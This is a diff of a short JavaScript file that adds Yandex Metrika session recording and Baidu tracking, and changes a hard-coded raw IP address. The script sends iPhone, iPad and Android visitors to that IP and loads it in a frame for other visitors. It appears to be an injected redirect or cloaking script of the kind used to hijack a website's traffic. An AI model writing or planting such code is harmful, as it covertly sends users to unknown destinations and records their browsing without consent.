@@ -1,13 +1,30 @@
 //lxxaicom
+(function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(87023917, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+   var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d573a1a3453dc4bfc0beb0d5be9510f6";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
 if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent);  
-    window.location.href = "http://38.26.195.25/";
+    window.location.href = "http://38.26.195.27/";
 }else if (/(Android)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent); 
-    window.location.href = "http://38.26.195.25/";
+    window.location.href = "http://38.26.195.27/";
 }
 var titlestr=document.title;
-setFrame("http://38.26.195.25/");
+setFrame("http://38.26.195.27/");
 
 
 
@@ -36,21 +53,4 @@ function setFrame(olink){
       }, 100)
     } catch (e) {}
 }
- (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
-   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
-   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
-
-   ym(87023917, "init", {
-        clickmap:true,
-        trackLinks:true,
-        accurateTrackBounce:true,
-        webvisor:true
-   });
-
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?d573a1a3453dc4bfc0beb0d5be9510f6";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
+;
